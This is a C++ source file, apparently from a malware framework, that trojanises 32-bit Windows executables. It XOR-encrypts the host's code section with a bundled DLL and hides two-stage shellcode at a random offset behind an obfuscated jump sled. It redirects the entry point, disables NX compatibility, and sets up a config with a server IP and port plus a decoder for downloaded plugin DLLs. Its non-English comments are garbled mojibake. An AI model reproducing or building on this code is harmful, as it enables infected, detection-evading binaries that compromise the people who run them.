#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "Lightbone/utils.h"
#include "Lightbone/api_resolver.h"
#include <pe_bliss.h>
#include <pe_bliss_resources.h>
#include <fstream>
#include <string>
#include <iostream>
#include "loader.h"
#include "packer.h"

#include "Service/SubServicePackage.h"
#include "Service/NetUtils.h"

using namespace pe_bliss;
using namespace Utils::Crypto;
using namespace ApiResolver;

pe_types_class_32::NtHeaders& get_nt_headers_32_ptr(pe_base* base)
{
    return *(pe_types_class_32::NtHeaders*)base->get_nt_headers_ptr();
}
bool copy_append_data(const std::string& target_file_path, const std::string& output_file_path)
{
    std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
    pe_base image(pe_factory::create_pe(pe_file));
    const section_list& pe_sections = image.get_image_sections();
    pe_sections.back().get_pointer_to_raw_data();
    pe_file.seekg(0, pe_file.end);
    size_t pe_file_size = pe_file.tellg();
    size_t pe_file_image_end = pe_sections.back().get_size_of_raw_data() + pe_sections.back().get_pointer_to_raw_data();
    if (pe_file_size == pe_file_image_end)
        return false;
    pe_file.seekg(pe_file_image_end);
    size_t append_data_size = pe_file_size - pe_file_image_end;
    std::unique_ptr<unsigned char[]> append_data(new unsigned char[append_data_size]);
    pe_file.read((char*)append_data.get(), append_data_size);
    std::ofstream output(output_file_path, std::ios::out | std::ios::binary | std::ios::app);
    output.seekp(0, output.end);
    output.write((char*)append_data.get(), append_data_size);
    pe_file.close();
    output.close();
    return true;
}
void copy_option_headers(pe_base* source, pe_base* dest)
{
    get_nt_headers_32_ptr(dest).OptionalHeader.BaseOfCode
        = get_nt_headers_32_ptr(source).OptionalHeader.BaseOfCode;
    get_nt_headers_32_ptr(dest).OptionalHeader.BaseOfData
        = get_nt_headers_32_ptr(source).OptionalHeader.BaseOfData;
    get_nt_headers_32_ptr(dest).OptionalHeader.SizeOfCode
        = get_nt_headers_32_ptr(source).OptionalHeader.SizeOfCode;
    get_nt_headers_32_ptr(dest).OptionalHeader.SizeOfInitializedData
        = get_nt_headers_32_ptr(source).OptionalHeader.SizeOfInitializedData;
    get_nt_headers_32_ptr(dest).OptionalHeader.SizeOfUninitializedData
        = get_nt_headers_32_ptr(source).OptionalHeader.SizeOfUninitializedData;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorLinkerVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorLinkerVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorImageVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorImageVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorOperatingSystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorOperatingSystemVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorSubsystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorSubsystemVersion;

    get_nt_headers_32_ptr(dest).OptionalHeader.MinorLinkerVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorLinkerVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MinorImageVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorImageVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MinorOperatingSystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorOperatingSystemVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MinorSubsystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorSubsystemVersion;
}
/**
 * @brief ��������ļ�
 * 
 * @param target_file_path Ŀ���ļ�·��
 * @param dll_path DLL�ļ�·��
 * @param output_file_path ����ļ�·��
 * @param stage_1_payload ��һ�׶���Ч�غ�
 * @param stage_2_payload �ڶ��׶���Ч�غ�
 * @param config �����ļ�·��
 * @return true �����ɹ�
 * @return false ����ʧ��
 */
bool build_packfile(const std::string& target_file_path, 
    const std::string& dll_path, 
    const std::string& output_file_path,
    const std::string& stage_1_payload,
    const std::string& stage_2_payload,
    const std::string& config)
{
    // ��Ŀ��PE�ļ�
    std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
    if (!pe_file)
    {
        return false;
    }
    // ����PE�ļ�����
    pe_base image(pe_factory::create_pe(pe_file));
    // ���PE�ļ������Ƿ�Ϊ32λ
    if (image.get_pe_type() == pe_type_64)
    {
        return false;
    }
    // �����µ�PE�ļ�����
    pe_base new_image(pe_properties_32(), image.get_section_alignment());

    // ����PE�ļ�������������
    new_image.set_characteristics(image.get_characteristics());
    new_image.set_dll_characteristics(image.get_dll_characteristics());
    new_image.set_file_alignment(image.get_file_alignment());
    new_image.set_heap_size_commit(image.get_heap_size_commit_64());
    new_image.set_heap_size_reserve(image.get_heap_size_reserve_64());
    new_image.set_stack_size_commit(image.get_stack_size_commit_64());
    new_image.set_stack_size_reserve(image.get_stack_size_reserve_64());
    new_image.set_image_base_64(image.get_image_base_64());
    new_image.set_ep(image.get_ep());
    new_image.set_number_of_rvas_and_sizes(new_image.pe_base::get_number_of_rvas_and_sizes());
    new_image.set_subsystem(image.get_subsystem());
    new_image.set_time_date_stamp(image.get_time_date_stamp());

    // ���ƿ�ѡͷ��Ϣ
    copy_option_headers(&image, &new_image);

    for (unsigned long i = 0; i < image.get_number_of_rvas_and_sizes(); ++i)
    {
        if (i == pe_win::image_directory_entry_bound_import)
        {
            new_image.set_directory_rva(i, 0);
            new_image.set_directory_size(i, 0);
        }
        else
        {
            new_image.set_directory_rva(i, image.get_directory_rva(i));
            new_image.set_directory_size(i, image.get_directory_size(i));
        }
    }

    // ���ƽ���Ϣ
    {
        const section_list& pe_sections = image.get_image_sections();
        for (section_list::const_iterator it = pe_sections.begin(); it != pe_sections.end(); ++it)
        {
            if (it->get_name() == ".reloc")
            {
                continue;
            }
            if (it->get_name() == ".rsrc")
            {
                continue;
            }
            new_image.set_section_virtual_size(new_image.add_section(*it), (*it).get_virtual_size());
        }
    }

    // �����������
    srand(::GetTickCount());
    // �������ܴ����
    section crypt_code_section;
    crypt_code_section.get_raw_data().resize(1);
    crypt_code_section.set_name(".mapo");
    crypt_code_section.readable(true);

    //// �������ݽṹ
    //share_data_t share = { kShareDateMagicKey,
    //{ 0xE8, 0, 0, 0, 0 },
    //0xE8, 
    // // ��ȥret_opcode�Ĵ�С,Ҳ����stage_1_payload�ĵ�ַ,Ҳ����call _loader_entry����
    //sizeof(share_data_t) - offsetof(share_data_t, ret_opcode),
    //0xC3 };
    // �������ݽṹ
    share_data_t share = { kShareDateMagicKey };

    // ��ʼ�� eip_opcode Ϊ��������
    memset(share.eip_opcode, 0x90, sizeof(share.eip_opcode)); // ʹ�� NOP ָ�����

    //share_data_t share = { 
    //    kShareDateMagicKey,
    //    {
    //    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x44, 0x53, 0x56, 0x57, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58, 0x50, 0x33, 0xC0, 0x0F, 0x9B, 0xC0, 0x52, 0x33, 0xD0, 0xC1, 0xE2, 0x02, 0x92, 0x5A, 0x0B, 0xC1, 0x58, 0x50, 0x52, 0x81, 0xF2, 0x90, 0x00, 0x00, 0x00, 0x52, 0x81, 0xEA, 0x80, 0x00, 0x00, 0x00, 0x58, 0x03, 0xC2, 0x5A, 0x58
    //    } 
    //};
    // �ڻ������������һЩ����ԣ����ӷ��������
    for (size_t i = 0; i < (sizeof(share.eip_opcode) - 5); i += 5) {
        share.eip_opcode[i] = 0xEB;     // ����תָ��
        share.eip_opcode[i + 1] = 0x03;   // ��ת 3 �ֽ�
    }
    int i = sizeof(share.eip_opcode) - 6;
    share.eip_opcode[++i] = 0xE8;
    share.eip_opcode[++i] = 0x0;
    share.eip_opcode[++i] = 0x0;
    share.eip_opcode[++i] = 0x0;
    share.eip_opcode[++i] = 0x0;
    // ���������ֶ�
    share.call_opcode = 0xE8;
    // ���ԣ���ӡ�ṹ���С��ƫ����Ϣ
    /*std::cout << "sizeof(share_data_t): " << sizeof(share_data_t) << std::endl;
    std::cout << "offsetof(share_data_t, ret_opcode): " << offsetof(share_data_t, ret_opcode) << std::endl;*/

    // ��ϸ��ӡ�ṹ������ֶε�ƫ�ƺʹ�С
    //std::cout << "ShareData �ṹ���ڴ沼������:" << std::endl;
    //std::cout << "magic ƫ��: " << offsetof(share_data_t, magic) 
    //          << ", ��С: " << sizeof(share.magic) << std::endl;
    //std::cout << "eip_opcode ƫ��: " << offsetof(share_data_t, eip_opcode) 
    //          << ", ��С: " << sizeof(share.eip_opcode) << std::endl;
    //std::cout << "call_opcode ƫ��: " << offsetof(share_data_t, call_opcode) 
    //          << ", ��С: " << sizeof(share.call_opcode) << std::endl;
    //std::cout << "entry_point_dist ƫ��: " << offsetof(share_data_t, entry_point_dist) 
    //          << ", ��С: " << sizeof(share.entry_point_dist) << std::endl;
    //std::cout << "ret_opcode ƫ��: " << offsetof(share_data_t, ret_opcode) 
    //          << ", ��С: " << sizeof(share.ret_opcode) << std::endl;
    //std::cout << "stub_rva ƫ��: " << offsetof(share_data_t, stub_rva) 
    //          << ", ��С: " << sizeof(share.stub_rva) << std::endl;
    //std::cout << "stub_size ƫ��: " << offsetof(share_data_t, stub_size) 
    //          << ", ��С: " << sizeof(share.stub_size) << std::endl;
    //std::cout << "stub_entry_rva ƫ��: " << offsetof(share_data_t, stub_entry_rva) 
    //          << ", ��С: " << sizeof(share.stub_entry_rva) << std::endl;
    //std::cout << "cfg_size ƫ��: " << offsetof(share_data_t, cfg_size) 
    //          << ", ��С: " << sizeof(share.cfg_size) << std::endl;
    //std::cout << "cfg ƫ��: " << offsetof(share_data_t, cfg) 
    //          << ", ��С: " << sizeof(share.cfg) << std::endl;
    //std::cout << "crypt_code_rva ƫ��: " << offsetof(share_data_t, crypt_code_rva) 
    //          << ", ��С: " << sizeof(share.crypt_code_rva) << std::endl;
    //std::cout << "crypt_code_size ƫ��: " << offsetof(share_data_t, crypt_code_size) 
    //          << ", ��С: " << sizeof(share.crypt_code_size) << std::endl;
    //std::cout << "oep ƫ��: " << offsetof(share_data_t, oep) 
    //          << ", ��С: " << sizeof(share.oep) << std::endl;
    //std::cout << "xor_key ƫ��: " << offsetof(share_data_t, xor_key) 
    //          << ", ��С: " << sizeof(share.xor_key) << std::endl;
    //std::cout << "origin_image_base ƫ��: " << offsetof(share_data_t, origin_image_base) 
    //          << ", ��С: " << sizeof(share.origin_image_base) << std::endl;
    //std::cout << "stage ƫ��: " << offsetof(share_data_t, stage) 
    //          << ", ��С: " << sizeof(share.stage) << std::endl;

    // ���� stage_1_payload (loader_entry) �ľ�ȷ��ַ
    share.entry_point_dist = sizeof(share_data_t) - offsetof(share_data_t, ret_opcode);

    //std::cout << "loader_entry ��ַ��������:" << std::endl;
    //std::cout << "���㹫ʽ: sizeof(share_data_t) - offsetof(ret_opcode) = "
    //    << sizeof(share_data_t) << " - "
    //    << offsetof(share_data_t, ret_opcode) << std::endl;
    //std::cout << "������: " << share.entry_point_dist << std::endl;
    share.ret_opcode = 0xC3;

    share.stage = 0;
    // ��ʼ�������shellcode
    std::string shellcode;
    shellcode.resize(sizeof(share) + stage_1_payload.size() + stage_2_payload.size());
    share.oep = image.get_ep();
    share.xor_key = rand();
    share.origin_image_base = image.get_image_base_64();
    memset(share.cfg, 0, sizeof(share.cfg));
    // ���������ļ�
    ProtocolCFGLoader cfg;
    auto json_str = Packer::load_file(config);
    cfg.json = json::parse(json_str);
    auto cfg_bin = cfg.dump();
    share.cfg_size = cfg_bin.size();
    // ��������ļ���С�Ƿ񳬹�����
    if(cfg_bin.size() > sizeof(share.cfg))
    {
        std::cerr << "cfg too big" << std::endl;
        return false;
    }
    // ���������ļ����ݵ��������ݽṹ
    memcpy(share.cfg, cfg_bin.data(), (std::min)(cfg_bin.size(), sizeof(share.cfg)));
    // �ض�λ��Ϣ����
    relocation_table_list relocs_tables(get_relocations(image));
    std::map<uint32_t, relocation_table> new_relocs_tables;
    std::vector<reloc_info_t> relocs;

    section code_section = new_image.get_image_sections().front();

    for (auto& table : relocs_tables)
    {
        for (auto& reloc : table.get_relocations())
        {
            if (code_section.get_virtual_address() <= table.get_rva() && table.get_rva() <= (code_section.get_virtual_address() + code_section.get_virtual_size()))
            {
                relocs.push_back({
                    reloc.get_type(),
                    table.get_rva() + reloc.get_rva()
                    });
            }
            else
            {
                new_relocs_tables[table.get_rva()].set_rva(table.get_rva());
                new_relocs_tables[table.get_rva()].add_relocation(reloc);
            }
        }
    }

    relocs_tables.clear();
    for (auto& new_relocs_tables_itor : new_relocs_tables)
    {
        relocs_tables.push_back(new_relocs_tables_itor.second);
    }
    // �����ض�λ��
    section new_relocs;
    new_relocs.get_raw_data().resize(1);
    new_relocs.set_name(".reloc");
    new_relocs.readable(true);
    section& attached_section = new_image.add_section(new_relocs);
    rebuild_relocations(new_image, relocs_tables, attached_section);
    // ������Դ��
    resource_directory root(get_resources(image));
    section rsrc;
    rsrc.set_name(".rsrc");
    rsrc.get_raw_data().resize(1);
    rsrc.readable(true);
    rsrc.set_flag(pe_win::image_scn_cnt_initialized_data, true);
    section& attach_rsrc = new_image.add_section(rsrc);
    rebuild_resources(new_image, root, attach_rsrc);

    // ����DLL�ļ�
    std::ifstream dll_file(dll_path, std::ios::in | std::ios::binary);
    dll_file.seekg(0, dll_file.end);
    const size_t bind_dll_size = dll_file.tellg();
    dll_file.seekg(0);

    const size_t text_code_size = code_section.get_raw_data().size();

    const size_t crypt_code_relocs_size = offsetof(crypt_code_t, reloc) + relocs.size() * sizeof(reloc_info_t) + text_code_size + bind_dll_size;
    std::unique_ptr<unsigned char[]> crypt_code(new unsigned char[crypt_code_relocs_size]);
    crypt_code_section.get_raw_data().resize(crypt_code_relocs_size);
    ((crypt_code_ptr_t)crypt_code.get())->text_code_size = text_code_size;
    ((crypt_code_ptr_t)crypt_code.get())->bind_dll_size = bind_dll_size;
    ((crypt_code_ptr_t)crypt_code.get())->reloc_size = relocs.size();
    int n = 0;
    for (auto& reloc : relocs)
    {
        ((crypt_code_ptr_t)crypt_code.get())->reloc[n].rva = reloc.rva;
        ((crypt_code_ptr_t)crypt_code.get())->reloc[n].type = reloc.type;
        n++;
    }
    const size_t text_code_offset = offsetof(crypt_code_t, reloc) + relocs.size() * sizeof(reloc_info_t);
	memcpy(crypt_code.get() + text_code_offset, code_section.get_raw_data().data(), text_code_size);

    if (bind_dll_size)
    {
        dll_file.read((char*)(crypt_code.get() + text_code_offset + text_code_size), bind_dll_size);
    }

    memcpy(crypt_code_section.get_raw_data().data(), crypt_code.get(), crypt_code_relocs_size);

    Utils::Crypto::xor_buffer(crypt_code_section.get_raw_data().data(), crypt_code_section.get_raw_data().size(), share.xor_key);
    section& bind_crypt_code_section = new_image.add_section(crypt_code_section);
    share.crypt_code_rva = bind_crypt_code_section.get_virtual_address();
    share.crypt_code_size = bind_crypt_code_section.get_raw_data().size();

    /*
    ����C++����ִ����һ���ض��ļ��㣬��������һ����Ϊ `random` �����ͱ���ֵ�����ֵ����������ͬ���ݴ�С�ļ��㣺`shellcode.size()` �� 
    `code_section.get_raw_data().size()`�������Ƕ����д������ϸ���ͣ�

    1. **`shellcode.size()`**:
       - �ⲿ�ֵ����� `shellcode` ����� `size()` ��Ա������`shellcode` �ܿ�����һ���洢��ĳ�����ݣ�����shellcode����һ��������Ŀ��ϵͳ
       ��ִ���ض�����Ļ����룩���������� `std::vector`��`std::string` �ȣ���`size()` ��������������Ԫ�ص����������� `std::string` ����
       ��������˵����ͨ����ζ�����ݵ��ֽ�����

    2. **`code_section.get_raw_data().size()`**:
       - ���`code_section` �ƺ���һ����������һ����Ա���� `get_raw_data()`�������������һ�����������Ƶ����ݽṹ���ýṹ������
       `code_section` ��ԭʼ���ݡ�Ȼ�󣬶�������ص����ݽṹ������ `size()` �������Ի�ȡ���С����Ԫ�ص��������ֽ�������

    3. **`(rand() % (code_section.get_raw_data().size() - shellcode.size()))`**:
       - `rand()` ��һ����׼�⺯������������һ��α���������������ͨ����һ����Խϴ��������
       - `%` ��ȡģ����������ڼ�������������Ҳ��������������������������һ���� `0` ��
       `(code_section.get_raw_data().size() - shellcode.size() - 1)` ��Χ�ڵ��������������ζ�ţ���� `code_section` �����ݴ�СԶ����
       `shellcode` �Ĵ�С��������ʽ������һ����Խ�С���������

    4. **`shellcode.size() + ...`**:
       - ��󣬽� `shellcode.size()` ��ֵ�������������ӡ�������`random` ��ֵ����һ�����ٵ��� `shellcode.size()` ����������󲻳���
       `code_section.get_raw_data().size()`����� `shellcode.size()` ��Ϊ�㣩��

    **Ŀ�ĺ���;**��

    ���д����Ŀ�Ŀ�����Ϊ����һ����������ݿ飨`code_section.get_raw_data()`���У����� `shellcode` �Ĵ�С�����ѡ��һ����ʼλ��������
    ����� `shellcode`��ͨ��ȷ�� `random` ��ֵ���ٵ��� `shellcode.size()`���������ּ�ڱ�����ѡ���λ��û���㹻�Ŀռ������� `shellcode`��
    Ȼ�������ּ��㷽ʽҲ���� `code_section.get_raw_data().size()` ���ڻ���� `2 * shellcode.size()`��Ϊ�˴��� `rand()` ���ܲ�������ֵ��
    ������������ȡģ���㣬��ֵʵ���ϲ���ֱ�Ӳ��������ӽ����Сֵ�Կ��ܵ��¿ռ䲻������⣬�����ж���ļ�飩��

    */
    int random = shellcode.size() + (rand() % (code_section.get_raw_data().size() - shellcode.size()));

    share.stub_rva = random;
    share.stub_size = shellcode.size();
    share.stub_entry_rva = sizeof(share_data_t) + stage_1_payload.size();

    // shellcode.data() = share + stage_1_payload + stage_2_payload;
	memcpy((void*)shellcode.data(), &share, sizeof(share));
	memcpy((unsigned char*)shellcode.data() + sizeof(share), stage_1_payload.data(), stage_1_payload.size());
	memcpy((unsigned char*)shellcode.data() + sizeof(share) + stage_1_payload.size(), stage_2_payload.data(), stage_2_payload.size());

    //��մ����
    //memset((void*)new_image.get_image_sections().front().get_raw_data().data(), 0xCC, code_section.get_raw_data().size());

    // ��֤�������image����Ч�����ڣ�����image�еĵ�������ݸ��Ƶ�new_image�еĶ�Ӧλ�á�
    if (image.get_image_sections().front().get_virtual_address() <= image.get_directory_rva(pe_win::image_directory_entry_import)
        && image.get_directory_rva(pe_win::image_directory_entry_import) <= image.get_image_sections().front().get_virtual_size())
    {
        section& old_text = image.get_image_sections().front();
        section& text = new_image.get_image_sections().front();
        memcpy(text.get_raw_data().data() + image.get_directory_rva(pe_win::image_directory_entry_import) - text.get_virtual_address(),
            old_text.get_raw_data().data() + image.get_directory_rva(pe_win::image_directory_entry_import) - old_text.get_virtual_address(),
            text.get_raw_data().size() - (image.get_directory_rva(pe_win::image_directory_entry_import) - text.get_virtual_address()));
    }

	//д��Ŀ���ļ������
	memcpy((void*)(new_image.get_image_sections().front().get_raw_data().data() + random), shellcode.data(), shellcode.size());

    new_image.set_ep(new_image.get_image_sections().front().get_virtual_address() + random + offsetof(share_data_t, eip_opcode));

    //�ر��ض�λ
    new_image.set_characteristics_flags(pe_bliss::pe_win::image_file_relocs_stripped);
    new_image.clear_characteristics_flags(pe_bliss::pe_win::image_dllcharacteristics_nx_compat);

    std::stringstream temp_pe(std::ios::out | std::ios::in | std::ios::binary);
    rebuild_pe(new_image, temp_pe);
    //new_image->set_checksum(calculate_checksum(temp_pe));

    std::ofstream new_pe_file(output_file_path.c_str(), std::ios::out | std::ios::binary | std::ios::trunc);
    if (new_pe_file.is_open() == false)
    {
        std::cerr << "�ļ�ռ��" << std::endl;
        return false;
    }
        
    rebuild_pe(new_image, new_pe_file);
    new_pe_file.close();

    copy_append_data(target_file_path, output_file_path);
    return true;
}

void make_template_cfg(const std::string& output)
{
    ProtocolCFGLoader cfg;
    cfg.set_field(ip_field_id, "127.0.0.1");
    cfg.set_field(port_field_id, kDefaultServicePort);
    cfg.set_field(test_mode_field_id, false);
    cfg.set_field(sec_no_change_field_id, true);
    std::ofstream file(output, std::ios::out | std::ios::binary);
    auto msg = cfg.json.dump();
    file.write(msg.data(), msg.size());
    file.close();
}

void expand_cache_dll(const std::string& src, const std::string& dst)
{
    auto buf = Packer::load_file(src);
    RawProtocolImpl package;
    package.decode(buf);
    auto raw_msg = msgpack::unpack((char*)package.body.buffer.data(), package.body.buffer.size());
    auto plugin = raw_msg.get().as<ProtocolS2CDownloadPlugin>();
    if (plugin.is_crypted)
    {
        xor_buffer(plugin.data.data(), plugin.data.size(), kProtocolXorKey);
    }
    std::ofstream output(dst, std::ios::out | std::ios::binary);
    output.write((char*)plugin.data.data(), plugin.data.size()); 
}
